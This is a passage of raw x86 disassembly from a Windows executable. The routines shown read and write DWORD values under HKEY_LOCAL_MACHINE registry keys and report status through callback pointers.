  404d8b:	pop    ebp
  404d8c:	ret    0x4
  404d8f:	int3   
  404d90:	int3   
  404d91:	int3   
  404d92:	int3   
  404d93:	int3   
  404d94:	mov    edi,edi
  404d96:	push   ebp
  404d97:	mov    ebp,esp
  404d99:	sub    esp,0x10
  404d9c:	lea    eax,[ebp-0x4]
  404d9f:	push   esi
  404da0:	push   eax
  404da1:	push   0x20119
  404da6:	push   0x0
  404da8:	push   0x401234
  404dad:	xor    esi,esi
  404daf:	push   0x80000002
  404db4:	inc    esi
  404db5:	call   DWORD PTR ds:0x40c008
  404dbb:	test   eax,eax
  404dbd:	jne    0x404dfd
  404dbf:	lea    eax,[ebp-0x8]
  404dc2:	mov    DWORD PTR [ebp-0x8],0x4
  404dc9:	push   eax
  404dca:	lea    eax,[ebp-0x10]
  404dcd:	push   eax
  404dce:	lea    eax,[ebp-0xc]
  404dd1:	push   eax
  404dd2:	push   0x0
  404dd4:	push   0x401250
  404dd9:	push   DWORD PTR [ebp-0x4]
  404ddc:	call   DWORD PTR ds:0x40c004
  404de2:	test   eax,eax
  404de4:	jne    0x404df4
  404de6:	cmp    DWORD PTR [ebp-0xc],0x4
  404dea:	jne    0x404df4
  404dec:	cmp    DWORD PTR [ebp-0x10],eax
  404def:	je     0x404df4
  404df1:	push   0x2
  404df3:	pop    esi
  404df4:	push   DWORD PTR [ebp-0x4]
  404df7:	call   DWORD PTR ds:0x40c00c
  404dfd:	mov    eax,esi
  404dff:	pop    esi
  404e00:	mov    esp,ebp
  404e02:	pop    ebp
  404e03:	ret    
  404e04:	int3   
  404e05:	int3   
  404e06:	int3   
  404e07:	int3   
  404e08:	int3   
  404e09:	mov    edi,edi
  404e0b:	push   ebp
  404e0c:	mov    ebp,esp
  404e0e:	push   ecx
  404e0f:	push   ecx
  404e10:	push   esi
  404e11:	mov    esi,ecx
  404e13:	call   0x404d94
  404e18:	cmp    esi,eax
  404e1a:	jne    0x404e20
  404e1c:	xor    eax,eax
  404e1e:	jmp    0x404e7d
  404e20:	push   edi
  404e21:	push   0x0
  404e23:	dec    esi
  404e24:	pop    edi
  404e25:	mov    DWORD PTR [ebp-0x4],edi
  404e28:	sub    esi,0x1
  404e2b:	jne    0x404e34
  404e2d:	mov    DWORD PTR [ebp-0x4],0x1
  404e34:	push   edi
  404e35:	lea    eax,[ebp-0x8]
  404e38:	push   eax
  404e39:	push   edi
  404e3a:	push   0x20106
  404e3f:	push   edi
  404e40:	push   edi
  404e41:	push   edi
  404e42:	push   0x401234
  404e47:	push   0x80000002
  404e4c:	call   DWORD PTR ds:0x40c000
  404e52:	mov    esi,eax
  404e54:	test   esi,esi
  404e56:	jne    0x404e7a
  404e58:	push   0x4
  404e5a:	lea    eax,[ebp-0x4]
  404e5d:	push   eax
  404e5e:	push   0x4
  404e60:	push   edi
  404e61:	push   0x401250
  404e66:	push   DWORD PTR [ebp-0x8]
  404e69:	call   DWORD PTR ds:0x40c010
  404e6f:	push   DWORD PTR [ebp-0x8]
  404e72:	mov    esi,eax
  404e74:	call   DWORD PTR ds:0x40c00c
  404e7a:	mov    eax,esi
  404e7c:	pop    edi
  404e7d:	pop    esi
  404e7e:	mov    esp,ebp
  404e80:	pop    ebp
  404e81:	ret    
  404e82:	int3   
  404e83:	int3   
  404e84:	int3   
  404e85:	int3   
  404e86:	int3   
  404e87:	mov    edi,edi
  404e89:	push   ebp
  404e8a:	mov    ebp,esp
  404e8c:	sub    esp,0x10
  404e8f:	and    DWORD PTR [ebp-0x4],0x0
  404e93:	lea    eax,[ebp-0x4]
  404e96:	push   esi
  404e97:	push   0x3
  404e99:	pop    esi
  404e9a:	push   eax
  404e9b:	push   0x20119
  404ea0:	push   0x0
  404ea2:	push   0x401188
  404ea7:	push   0x80000002
  404eac:	call   DWORD PTR ds:0x40c008
  404eb2:	test   eax,eax
  404eb4:	jne    0x404eed
  404eb6:	lea    eax,[ebp-0x8]
  404eb9:	mov    DWORD PTR [ebp-0x8],0x4
  404ec0:	push   eax
  404ec1:	lea    eax,[ebp-0x10]
  404ec4:	push   eax
  404ec5:	lea    eax,[ebp-0xc]
  404ec8:	push   eax
  404ec9:	push   0x0
  404ecb:	push   0x40120c
  404ed0:	push   DWORD PTR [ebp-0x4]
  404ed3:	call   DWORD PTR ds:0x40c004
  404ed9:	test   eax,eax
  404edb:	jne    0x404eed
  404edd:	cmp    DWORD PTR [ebp-0xc],0x4
  404ee1:	jne    0x404eed
  404ee3:	cmp    DWORD PTR [ebp-0x10],eax
  404ee6:	je     0x404eed
  404ee8:	push   0x2
  404eea:	pop    esi
  404eeb:	jmp    0x404efa
  404eed:	call   0x404d94
  404ef2:	cmp    eax,0x2
  404ef5:	jne    0x404efa
  404ef7:	xor    esi,esi
  404ef9:	inc    esi
  404efa:	cmp    DWORD PTR [ebp-0x4],0x0
  404efe:	je     0x404f09
  404f00:	push   DWORD PTR [ebp-0x4]
  404f03:	call   DWORD PTR ds:0x40c00c
  404f09:	mov    eax,esi
  404f0b:	pop    esi
  404f0c:	mov    esp,ebp
  404f0e:	pop    ebp
  404f0f:	ret    
  404f10:	int3   
  404f11:	int3   
  404f12:	int3   
  404f13:	int3   
  404f14:	int3   
  404f15:	mov    edi,edi
  404f17:	push   ebp
  404f18:	mov    ebp,esp
  404f1a:	sub    esp,0x10
  404f1d:	push   esi
  404f1e:	lea    eax,[ebp-0x4]
  404f21:	xor    esi,esi
  404f23:	push   eax
  404f24:	push   0x20119
  404f29:	push   esi
  404f2a:	push   0x401188
  404f2f:	push   0x80000002
  404f34:	mov    DWORD PTR [ebp-0x4],esi
  404f37:	call   DWORD PTR ds:0x40c008
  404f3d:	test   eax,eax
  404f3f:	jne    0x404f7e
  404f41:	push   edi
  404f42:	push   0x4
  404f44:	pop    edi
  404f45:	lea    eax,[ebp-0xc]
  404f48:	mov    DWORD PTR [ebp-0xc],edi
  404f4b:	push   eax
  404f4c:	lea    eax,[ebp-0x8]
  404f4f:	push   eax
  404f50:	lea    eax,[ebp-0x10]
  404f53:	push   eax
  404f54:	push   esi
  404f55:	push   0x4011ec
  404f5a:	push   DWORD PTR [ebp-0x4]
  404f5d:	call   DWORD PTR ds:0x40c004
  404f63:	test   eax,eax
  404f65:	jne    0x404f74
  404f67:	cmp    DWORD PTR [ebp-0x10],edi
  404f6a:	jne    0x404f74
  404f6c:	cmp    DWORD PTR [ebp-0x8],edi
  404f6f:	jae    0x404f74
  404f71:	mov    esi,DWORD PTR [ebp-0x8]
  404f74:	push   DWORD PTR [ebp-0x4]
  404f77:	call   DWORD PTR ds:0x40c00c
  404f7d:	pop    edi
  404f7e:	mov    eax,esi
  404f80:	pop    esi
  404f81:	mov    esp,ebp
  404f83:	pop    ebp
  404f84:	ret    
  404f85:	int3   
  404f86:	int3   
  404f87:	int3   
  404f88:	int3   
  404f89:	int3   
  404f8a:	mov    edi,edi
  404f8c:	push   ebp
  404f8d:	mov    ebp,esp
  404f8f:	push   ecx
  404f90:	push   ecx
  404f91:	push   edi
  404f92:	xor    edi,edi
  404f94:	mov    DWORD PTR [ebp-0x4],edi
  404f97:	call   0x404e87
  404f9c:	cmp    eax,0x2
  404f9f:	jne    0x404fa5
  404fa1:	xor    eax,eax
  404fa3:	jmp    0x404ff6
  404fa5:	push   esi
  404fa6:	push   edi
  404fa7:	lea    eax,[ebp-0x8]
  404faa:	push   eax
  404fab:	push   edi
  404fac:	push   0x20106
  404fb1:	push   edi
  404fb2:	push   edi
  404fb3:	push   edi
  404fb4:	push   0x401188
  404fb9:	push   0x80000002
  404fbe:	call   DWORD PTR ds:0x40c000
  404fc4:	mov    esi,eax
  404fc6:	test   esi,esi
  404fc8:	jne    0x404ff3
  404fca:	push   0x4
  404fcc:	lea    eax,[ebp-0x4]
  404fcf:	mov    DWORD PTR [ebp-0x4],0x1
  404fd6:	push   eax
  404fd7:	push   0x4
  404fd9:	push   edi
  404fda:	push   0x40120c
  404fdf:	push   DWORD PTR [ebp-0x8]
  404fe2:	call   DWORD PTR ds:0x40c010
  404fe8:	push   DWORD PTR [ebp-0x8]
  404feb:	mov    esi,eax
  404fed:	call   DWORD PTR ds:0x40c00c
  404ff3:	mov    eax,esi
  404ff5:	pop    esi
  404ff6:	pop    edi
  404ff7:	mov    esp,ebp
  404ff9:	pop    ebp
  404ffa:	ret    
  404ffb:	int3   
  404ffc:	int3   
  404ffd:	int3   
  404ffe:	int3   
  404fff:	int3   
  405000:	mov    edi,edi
  405002:	push   ebp
  405003:	mov    ebp,esp
  405005:	push   ecx
  405006:	push   ecx
  405007:	mov    eax,ds:0x408008
  40500c:	xor    eax,ebp
  40500e:	mov    DWORD PTR [ebp-0x4],eax
  405011:	push   ebx
  405012:	push   esi
  405013:	push   edi
  405014:	xor    edi,edi
  405016:	lea    eax,[ebp-0x8]
  405019:	push   edi
  40501a:	push   eax
  40501b:	push   edi
  40501c:	push   0x20106
  405021:	push   edi
  405022:	push   edi
  405023:	push   edi
  405024:	push   0x401234
  405029:	push   0x80000002
  40502e:	mov    ebx,ecx
  405030:	call   DWORD PTR ds:0x40c000
  405036:	mov    esi,eax
  405038:	test   esi,esi
  40503a:	jne    0x405074
  40503c:	push   DWORD PTR [ebp-0x8]
  40503f:	call   DWORD PTR ds:0x40c00c
  405045:	push   edi
  405046:	lea    eax,[ebp-0x8]
  405049:	push   eax
  40504a:	push   edi
  40504b:	push   0x20106
  405050:	push   edi
  405051:	push   edi
  405052:	push   edi
  405053:	push   0x401188
  405058:	push   0x80000002
  40505d:	call   DWORD PTR ds:0x40c000
  405063:	mov    esi,eax
  405065:	test   esi,esi
  405067:	jne    0x405074
  405069:	push   DWORD PTR [ebp-0x8]
  40506c:	call   DWORD PTR ds:0x40c00c
  405072:	jmp    0x40509e
  405074:	mov    edi,DWORD PTR [ebx+0x60]
  405077:	test   edi,edi
  405079:	je     0x405088
  40507b:	push   0x27
  40507d:	mov    ecx,edi
  40507f:	call   DWORD PTR ds:0x40c1a4
  405085:	call   edi
  405087:	pop    ecx
  405088:	mov    edi,DWORD PTR [ebx+0x64]
  40508b:	test   edi,edi
  40508d:	je     0x40509e
  40508f:	push   esi
  405090:	push   0x0
  405092:	mov    ecx,edi
  405094:	call   DWORD PTR ds:0x40c1a4
  40509a:	call   edi
  40509c:	pop    ecx
  40509d:	pop    ecx
  40509e:	mov    ecx,DWORD PTR [ebp-0x4]
  4050a1:	xor    eax,eax
  4050a3:	test   esi,esi
  4050a5:	pop    edi
  4050a6:	sete   al
  4050a9:	xor    ecx,ebp
  4050ab:	pop    esi
  4050ac:	pop    ebx
  4050ad:	call   0x406fc0
  4050b2:	mov    esp,ebp
  4050b4:	pop    ebp
  4050b5:	ret    
  4050b6:	int3   
  4050b7:	int3   
  4050b8:	int3   
  4050b9:	int3   
  4050ba:	int3   
  4050bb:	mov    edi,edi
  4050bd:	push   ebp
  4050be:	mov    ebp,esp
  4050c0:	sub    esp,0x414
  4050c6:	mov    eax,ds:0x408008
  4050cb:	xor    eax,ebp
  4050cd:	mov    DWORD PTR [ebp-0x4],eax
  4050d0:	push   esi
  4050d1:	push   edi
  4050d2:	mov    esi,edx
  4050d4:	mov    edi,ecx
  4050d6:	mov    ecx,esi
  4050d8:	call   0x405000
  4050dd:	test   al,al
  4050df:	je     0x4051b1
  4050e5:	or     DWORD PTR [esi],0x60
  4050e8:	lea    eax,[ebp-0x20c]
  4050ee:	push   ebx
  4050ef:	mov    ebx,0x104
  4050f4:	mov    DWORD PTR [esi+0x68],0x402f50
  4050fb:	push   ebx
  4050fc:	push   eax
  4050fd:	call   DWORD PTR ds:0x40c080
  405103:	test   eax,eax
  405105:	je     0x40517c
  405107:	cmp    eax,ebx
  405109:	jae    0x40517c
  40510b:	push   0x40158c
  405110:	lea    eax,[ebp-0x20c]
  405116:	push   ebx
  405117:	push   eax
  405118:	call   DWORD PTR ds:0x40c160
  40511e:	add    esp,0xc
  405121:	test   eax,eax
  405123:	je     0x405144
  405125:	mov    edi,DWORD PTR [esi+0x60]
  405128:	test   edi,edi
  40512a:	je     0x405139
  40512c:	push   0x1b
  40512e:	mov    ecx,edi
  405130:	call   DWORD PTR ds:0x40c1a4
  405136:	call   edi
  405138:	pop    ecx
  405139:	mov    esi,DWORD PTR [esi+0x64]
  40513c:	test   esi,esi
  40513e:	je     0x4051ae
  405140:	push   0x7a
  405142:	jmp    0x4051a0
  405144:	push   0x401178
  405149:	lea    eax,[ebp-0x414]
  40514f:	push   ebx
  405150:	push   eax
  405151:	call   DWORD PTR ds:0x40c15c
  405157:	add    esp,0xc
  40515a:	test   eax,eax
  40515c:	jne    0x405125
  40515e:	or     DWORD PTR [esi],0xb
  405161:	lea    eax,[ebp-0x414]
  405167:	push   esi
  405168:	push   eax
  405169:	lea    eax,[ebp-0x20c]
  40516f:	mov    ecx,edi
  405171:	push   eax
  405172:	call   DWORD PTR ds:0x40c1a4
  405178:	call   edi
  40517a:	jmp    0x4051b0
  40517c:	mov    edi,DWORD PTR [esi+0x60]
  40517f:	test   edi,edi
  405181:	je     0x405190
  405183:	push   0x1b
  405185:	mov    ecx,edi
  405187:	call   DWORD PTR ds:0x40c1a4
  40518d:	call   edi
  40518f:	pop    ecx
  405190:	cmp    DWORD PTR [esi+0x64],0x0
  405194:	je     0x4051ae
  405196:	call   DWORD PTR ds:0x40c048
  40519c:	mov    esi,DWORD PTR [esi+0x64]
  40519f:	push   eax
  4051a0:	push   0x0
  4051a2:	mov    ecx,esi
  4051a4:	call   DWORD PTR ds:0x40c1a4
  4051aa:	call   esi
  4051ac:	pop    ecx
  4051ad:	pop    ecx
  4051ae:	xor    al,al
  4051b0:	pop    ebx
  4051b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4051b4:	pop    edi
  4051b5:	xor    ecx,ebp
  4051b7:	pop    esi
  4051b8:	call   0x406fc0
  4051bd:	mov    esp,ebp
  4051bf:	pop    ebp
  4051c0:	ret    
  4051c1:	int3   
  4051c2:	int3   
  4051c3:	int3   
  4051c4:	int3   
  4051c5:	int3   
  4051c6:	int3   
  4051c7:	int3   
  4051c8:	int3   
  4051c9:	int3   
  4051ca:	int3   
  4051cb:	int3   
  4051cc:	int3   
  4051cd:	int3   
  4051ce:	int3   
  4051cf:	int3   
  4051d0:	mov    edi,edi
  4051d2:	push   ebp
  4051d3:	mov    ebp,esp
  4051d5:	push   ecx
  4051d6:	push   ecx
  4051d7:	mov    eax,ds:0x408008
  4051dc:	xor    eax,ebp
  4051de:	mov    DWORD PTR [ebp-0x4],eax
  4051e1:	push   ebx
  4051e2:	push   esi
  4051e3:	call   0x404f15
  4051e8:	mov    esi,DWORD PTR [ebp+0x10]
  4051eb:	mov    ecx,0x403d70
  4051f0:	mov    edx,esi
  4051f2:	mov    DWORD PTR [esi+0x4],eax
  4051f5:	call   0x4050bb
  4051fa:	mov    bl,al
  4051fc:	test   bl,bl
  4051fe:	je     0x405248
  405200:	push   0x2
  405202:	pop    ecx
  405203:	call   0x404e09
  405208:	mov    DWORD PTR [ebp-0x8],eax
  40520b:	test   eax,eax
  40520d:	je     0x405248
  40520f:	push   edi
  405210:	mov    edi,DWORD PTR [esi+0x60]
  405213:	test   edi,edi
  405215:	je     0x405227
  405217:	push   0x1c
  405219:	mov    ecx,edi
  40521b:	call   DWORD PTR ds:0x40c1a4
  405221:	call   edi
  405223:	mov    eax,DWORD PTR [ebp-0x8]
  405226:	pop    ecx
  405227:	mov    esi,DWORD PTR [esi+0x64]
  40522a:	xor    ebx,ebx
  40522c:	pop    edi
  40522d:	test   esi,esi
  40522f:	je     0x40523f
  405231:	push   eax
  405232:	push   ebx
  405233:	mov    ecx,esi
  405235:	call   DWORD PTR ds:0x40c1a4
  40523b:	call   esi
  40523d:	pop    ecx
  40523e:	pop    ecx
  40523f:	push   DWORD PTR [ebp-0x8]
  405242:	call   DWORD PTR ds:0x40c06c
  405248:	mov    ecx,DWORD PTR [ebp-0x4]
  40524b:	mov    al,bl
  40524d:	pop    esi
  40524e:	xor    ecx,ebp
  405250:	pop    ebx
  405251:	call   0x406fc0
  405256:	mov    esp,ebp
  405258:	pop    ebp
  405259:	ret    0xc
  40525c:	int3   
  40525d:	int3   
  40525e:	int3   
  40525f:	int3   
  405260:	int3   
  405261:	int3   
  405262:	int3   
  405263:	int3   
  405264:	int3   
  405265:	int3   
  405266:	int3   
  405267:	int3   
  405268:	int3   
  405269:	int3   
  40526a:	int3   
  40526b:	int3   
  40526c:	int3   
  40526d:	int3   
  40526e:	int3   
  40526f:	int3   
  405270:	mov    edi,edi
  405272:	push   ebp
  405273:	mov    ebp,esp
  405275:	push   ecx
  405276:	mov    eax,ds:0x408008
  40527b:	xor    eax,ebp
  40527d:	mov    DWORD PTR [ebp-0x4],eax
  405280:	push   esi
  405281:	mov    esi,DWORD PTR [ebp+0x8]
  405284:	push   edi
  405285:	cmp    DWORD PTR [esi+0x14],0x0
  405289:	jl     0x4052ad
  40528b:	jg     0x405293
  40528d:	cmp    DWORD PTR [esi+0x10],0x0
  405291:	jbe    0x4052ad
  405293:	mov    edi,DWORD PTR [esi+0x60]
  405296:	test   edi,edi
  405298:	je     0x4052a7
  40529a:	push   0x1e
  40529c:	mov    ecx,edi
  40529e:	call   DWORD PTR ds:0x40c1a4
  4052a4:	call   edi
  4052a6:	pop    ecx
  4052a7:	push   esi
  4052a8:	call   0x4043b0
  4052ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4052b0:	pop    edi
  4052b1:	xor    ecx,ebp
  4052b3:	pop    esi
  4052b4:	call   0x406fc0
  4052b9:	mov    esp,ebp
  4052bb:	pop    ebp
  4052bc:	ret    0x4
  4052bf:	int3   
  4052c0:	int3   
  4052c1:	int3   
  4052c2:	int3   
  4052c3:	int3   
  4052c4:	int3   
  4052c5:	int3   
  4052c6:	int3   
  4052c7:	int3   
  4052c8:	int3   
  4052c9:	int3   
  4052ca:	int3   
  4052cb:	int3   
  4052cc:	int3   
  4052cd:	int3   
  4052ce:	int3   
  4052cf:	int3   
  4052d0:	mov    edi,edi
  4052d2:	push   ebp
  4052d3:	mov    ebp,esp
  4052d5:	push   ecx
  4052d6:	mov    eax,ds:0x408008
  4052db:	xor    eax,ebp
  4052dd:	mov    DWORD PTR [ebp-0x4],eax
  4052e0:	push   ebx
  4052e1:	push   edi
  4052e2:	mov    edi,DWORD PTR [ebp+0x10]
  4052e5:	mov    ecx,0x404790
  4052ea:	mov    edx,edi
  4052ec:	or     DWORD PTR [edi+0x4],0xffffffff
  4052f0:	call   0x4050bb
  4052f5:	mov    bl,al
  4052f7:	test   bl,bl
  4052f9:	je     0x405348
  4052fb:	xor    ecx,ecx
  4052fd:	push   esi
  4052fe:	inc    ecx
  4052ff:	call   0x404e09
  405304:	mov    esi,eax
  405306:	test   esi,esi
  405308:	jne    0x405315
  40530a:	call   0x404f8a
  40530f:	mov    esi,eax
  405311:	test   esi,esi
  405313:	je     0x405347
  405315:	mov    ebx,DWORD PTR [edi+0x60]
  405318:	test   ebx,ebx
  40531a:	je     0x405329
  40531c:	push   0x1c
  40531e:	mov    ecx,ebx
  405320:	call   DWORD PTR ds:0x40c1a4
  405326:	call   ebx
  405328:	pop    ecx
  405329:	mov    edi,DWORD PTR [edi+0x64]
  40532c:	xor    ebx,ebx
  40532e:	test   edi,edi
  405330:	je     0x405340
  405332:	push   esi
  405333:	push   ebx
  405334:	mov    ecx,edi
  405336:	call   DWORD PTR ds:0x40c1a4
  40533c:	call   edi
  40533e:	pop    ecx
  40533f:	pop    ecx
  405340:	push   esi
  405341:	call   DWORD PTR ds:0x40c06c
  405347:	pop    esi
  405348:	mov    ecx,DWORD PTR [ebp-0x4]
  40534b:	mov    al,bl
  40534d:	pop    edi
  40534e:	xor    ecx,ebp
  405350:	pop    ebx
  405351:	call   0x406fc0
  405356:	mov    esp,ebp
  405358:	pop    ebp
  405359:	ret    0xc
  40535c:	int3   
  40535d:	int3   
  40535e:	int3   
  40535f:	int3   
  405360:	int3   
  405361:	int3   
  405362:	int3   
  405363:	int3   
  405364:	int3   
  405365:	int3   
  405366:	int3   
  405367:	int3   
  405368:	int3   
  405369:	int3   
  40536a:	int3   
  40536b:	int3   
  40536c:	int3   
  40536d:	int3   
  40536e:	int3   
  40536f:	int3   
  405370:	mov    edi,edi
  405372:	push   ebp
  405373:	mov    ebp,esp
  405375:	push   ecx
  405376:	mov    eax,ds:0x408008
  40537b:	xor    eax,ebp
  40537d:	mov    DWORD PTR [ebp-0x4],eax
  405380:	push   esi
  405381:	mov    esi,DWORD PTR [ebp+0x8]
  405384:	push   edi
  405385:	cmp    DWORD PTR [esi+0x14],0x0
  405389:	jl     0x4053ad
  40538b:	jg     0x405393
  40538d:	cmp    DWORD PTR [esi+0x10],0x0
  405391:	jbe    0x4053ad
  405393:	mov    edi,DWORD PTR [esi+0x60]
  405396:	test   edi,edi
  405398:	je     0x4053a7
  40539a:	push   0x20
  40539c:	mov    ecx,edi
  40539e:	call   DWORD PTR ds:0x40c1a4
  4053a4:	call   edi
  4053a6:	pop    ecx
  4053a7:	push   esi
  4053a8:	call   0x404d10
  4053ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4053b0:	pop    edi
  4053b1:	xor    ecx,ebp
  4053b3:	pop    esi
  4053b4:	call   0x406fc0
  4053b9:	mov    esp,ebp
  4053bb:	pop    ebp
  4053bc:	ret    0x4
  4053bf:	int3   
  4053c0:	int3   
  4053c1:	int3   
  4053c2:	int3   
  4053c3:	int3   
  4053c4:	int3   
  4053c5:	int3   
  4053c6:	int3   
  4053c7:	int3   
  4053c8:	int3   
  4053c9:	int3   
  4053ca:	int3   
  4053cb:	int3   
  4053cc:	int3   
  4053cd:	int3   
  4053ce:	int3   
  4053cf:	int3   
  4053d0:	mov    edi,edi
  4053d2:	push   ebp
  4053d3:	mov    ebp,esp
  4053d5:	sub    esp,0x424
  4053db:	mov    eax,ds:0x408008
  4053e0:	xor    eax,ebp
  4053e2:	mov    DWORD PTR [ebp-0x8],eax
  4053e5:	push   esi
  4053e6:	mov    esi,DWORD PTR [ebp+0x10]
  4053e9:	push   edi
  4053ea:	call   0x404d94
  4053ef:	cmp    eax,0x2
  4053f2:	jne    0x405414
  4053f4:	mov    edi,DWORD PTR [esi+0x60]
  4053f7:	test   edi,edi
  4053f9:	je     0x405408
  4053fb:	push   0x21
  4053fd:	mov    ecx,edi
  4053ff:	call   DWORD PTR ds:0x40c1a4
  405405:	call   edi
  405407:	pop    ecx
  405408:	mov    DWORD PTR [esi+0x8],0x64
  40540f:	jmp    0x40550c
  405414:	cmp    eax,0x1
  405417:	jne    0x40542d
  405419:	call   0x404e87
  40541e:	sub    eax,0x1
  405421:	je     0x405475
  405423:	sub    eax,0x1
  405426:	je     0x405455
  405428:	sub    eax,0x1
  40542b:	je     0x405475
  40542d:	mov    esi,DWORD PTR [esi+0x60]
  405430:	test   esi,esi
  405432:	je     0x405441
  405434:	push   0x26
  405436:	mov    ecx,esi
  405438:	call   DWORD PTR ds:0x40c1a4
  40543e:	call   esi
  405440:	pop    ecx
  405441:	xor    al,al
  405443:	mov    ecx,DWORD PTR [ebp-0x8]
  405446:	pop    edi
  405447:	xor    ecx,ebp
  405449:	pop    esi
  40544a:	call   0x406fc0
  40544f:	mov    esp,ebp
  405451:	pop    ebp
  405452:	ret    0xc
  405455:	mov    edi,DWORD PTR [esi+0x60]
  405458:	test   edi,edi
  40545a:	je     0x405469
  40545c:	push   0x22
  40545e:	mov    ecx,edi
  405460:	call   DWORD PTR ds:0x40c1a4
  405466:	call   edi
  405468:	pop    ecx
  405469:	mov    DWORD PTR [esi+0x8],0x65
  405470:	jmp    0x40550c
  405475:	mov    edi,0x104
  40547a:	lea    eax,[ebp-0x214]
  405480:	push   edi
  405481:	push   eax
  405482:	call   DWORD PTR ds:0x40c080
  405488:	test   eax,eax
  40548a:	je     0x4054f1
  40548c:	push   edi
  40548d:	lea    eax,[ebp-0x41c]
  405493:	push   eax
  405494:	lea    eax,[ebp-0x214]
  40549a:	push   eax
  40549b:	call   DWORD PTR ds:0x40c060
  4054a1:	test   eax,eax
  4054a3:	je     0x4054f1
  4054a5:	lea    edx,[ebp-0x420]
  4054ab:	lea    ecx,[ebp-0x41c]
  4054b1:	call   0x40693e
  4054b6:	mov    edi,DWORD PTR [esi+0x60]
  4054b9:	test   eax,eax
  4054bb:	je     0x4054d7
  4054bd:	test   edi,edi
  4054bf:	je     0x4054ce
  4054c1:	push   0x24
  4054c3:	mov    ecx,edi
  4054c5:	call   DWORD PTR ds:0x40c1a4
  4054cb:	call   edi
  4054cd:	pop    ecx
  4054ce:	mov    DWORD PTR [esi+0x8],0x67
  4054d5:	jmp    0x40550c
  4054d7:	test   edi,edi
  4054d9:	je     0x4054e8
  4054db:	push   0x23
  4054dd:	mov    ecx,edi
  4054df:	call   DWORD PTR ds:0x40c1a4
  4054e5:	call   edi
  4054e7:	pop    ecx
  4054e8:	mov    DWORD PTR [esi+0x8],0x66
  4054ef:	jmp    0x40550c
  4054f1:	mov    edi,DWORD PTR [esi+0x60]
  4054f4:	test   edi,edi
  4054f6:	je     0x405505
  4054f8:	push   0x25
  4054fa:	mov    ecx,edi
  4054fc:	call   DWORD PTR ds:0x40c1a4
  405502:	call   edi
  405504:	pop    ecx
  405505:	mov    DWORD PTR [esi+0x8],0x68
  40550c:	mov    al,0x1
  40550e:	jmp    0x405443
  405513:	int3   
  405514:	int3   
  405515:	int3   
  405516:	int3   
  405517:	int3   
  405518:	int3   
  405519:	int3   
  40551a:	int3   
  40551b:	int3   
  40551c:	int3   
  40551d:	int3   
  40551e:	int3   
  40551f:	int3   
  405520:	ret    0x4
  405523:	int3   
  405524:	int3   
  405525:	int3   
  405526:	int3   
  405527:	int3   
  405528:	mov    eax,fs:0x18
  40552e:	push   esi
  40552f:	mov    esi,ecx
  405531:	and    DWORD PTR [esi],0x0
  405534:	cmp    DWORD PTR [eax+0xf9c],0x0
  40553b:	je     0x40556b
  40553d:	push   esi
  40553e:	push   0x1
  405540:	push   0xc
  405542:	call   DWORD PTR ds:0x40c0a0
  405548:	push   eax
  405549:	call   DWORD PTR ds:0x40c01c
  40554f:	test   eax,eax
  405551:	jne    0x405560
  405553:	call   DWORD PTR ds:0x40c048
  405559:	cmp    eax,0x3f0
  40555e:	jne    0x40556d
  405560:	cmp    DWORD PTR [esi],0x0
  405563:	je     0x40556b
  405565:	call   DWORD PTR ds:0x40c018
  40556b:	xor    eax,eax
  40556d:	pop    esi
  40556e:	ret    
  40556f:	int3   
  405570:	int3   
  405571:	int3   
  405572:	int3   
  405573:	int3   
  405574:	mov    edi,edi
  405576:	push   ebp
  405577:	mov    ebp,esp
  405579:	sub    esp,0xc
  40557c:	push   esi
  40557d:	lea    eax,[ebp-0x4]
  405580:	mov    DWORD PTR [ebp-0x4],0x4
  405587:	push   eax
  405588:	lea    eax,[ebp-0xc]
  40558b:	mov    esi,edx
  40558d:	push   eax
  40558e:	lea    eax,[ebp-0x8]
  405591:	push   eax
  405592:	push   0x0
  405594:	push   esi
  405595:	push   ecx
  405596:	call   DWORD PTR ds:0x40c004
  40559c:	test   eax,eax
  40559e:	jne    0x4055cc
  4055a0:	cmp    DWORD PTR [ebp-0x8],0x4
  4055a4:	jne    0x4055cc
  4055a6:	cmp    DWORD PTR ds:0x408408,0x0
  4055ad:	mov    eax,DWORD PTR [ebp+0x8]
  4055b0:	mov    ecx,DWORD PTR [ebp-0xc]
  4055b3:	mov    DWORD PTR [eax],ecx
  4055b5:	je     0x4055c7
  4055b7:	push   ecx
  4055b8:	push   esi
  4055b9:	push   0x4015b0
  4055be:	call   DWORD PTR ds:0x40c10c
  4055c4:	add    esp,0xc
  4055c7:	xor    eax,eax
  4055c9:	inc    eax
  4055ca:	jmp    0x4055ce
  4055cc:	xor    eax,eax
  4055ce:	pop    esi
  4055cf:	mov    esp,ebp
  4055d1:	pop    ebp
  4055d2:	ret    0x4
  4055d5:	int3   
  4055d6:	int3   
  4055d7:	int3   
  4055d8:	int3   
  4055d9:	int3   
  4055da:	mov    edi,edi
  4055dc:	push   ebp
  4055dd:	mov    ebp,esp
  4055df:	push   ecx
  4055e0:	push   ecx
  4055e1:	push   edi
  4055e2:	lea    eax,[ebp-0x4]
  4055e5:	mov    edi,edx
  4055e7:	push   eax
  4055e8:	push   0x20119
  4055ed:	push   0x0
  4055ef:	push   0x401188
  4055f4:	push   0x80000002
  4055f9:	call   DWORD PTR ds:0x40c008
  4055ff:	test   eax,eax
  405601:	je     0x405607
  405603:	xor    eax,eax
  405605:	jmp    0x405630
  405607:	mov    ecx,DWORD PTR [ebp-0x4]
  40560a:	lea    eax,[ebp-0x8]
  40560d:	push   esi
  40560e:	push   eax
  40560f:	mov    edx,0x401898
  405614:	call   0x405574
  405619:	mov    esi,eax
  40561b:	test   esi,esi
  40561d:	je     0x405624
  40561f:	mov    ecx,DWORD PTR [ebp-0x8]
  405622:	mov    DWORD PTR [edi],ecx
  405624:	push   DWORD PTR [ebp-0x4]
  405627:	call   DWORD PTR ds:0x40c00c
  40562d:	mov    eax,esi
  40562f:	pop    esi
  405630:	pop    edi
  405631:	mov    esp,ebp
  405633:	pop    ebp
  405634:	ret    
  405635:	int3   
  405636:	int3   
  405637:	int3   
  405638:	int3   
  405639:	int3   
  40563a:	mov    edi,edi
  40563c:	push   ebp
  40563d:	mov    ebp,esp
  40563f:	push   ecx
  405640:	cmp    DWORD PTR ds:0x40840c,0x0
  405647:	push   esi
  405648:	mov    esi,edx
  40564a:	jne    0x4056a1
  40564c:	test   ecx,ecx
  40564e:	jne    0x40568a
  405650:	push   ecx
  405651:	lea    eax,[ebp-0x4]
  405654:	push   eax
  405655:	push   ecx
  405656:	push   0xf013f
